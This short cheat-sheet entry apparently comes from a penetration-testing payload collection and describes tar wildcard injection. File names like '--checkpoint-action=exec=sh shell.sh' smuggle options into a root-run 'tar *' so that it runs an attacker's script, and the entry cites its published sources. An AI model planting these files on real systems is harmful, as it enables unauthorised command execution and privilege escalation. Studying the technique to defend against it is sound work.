# TAR Command Execution

By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.

## Exploit

These files work against a "tar *"

```powershell
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
shell.sh   (your exploit code is here)
```

## Thanks to

* [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
* [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
* [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)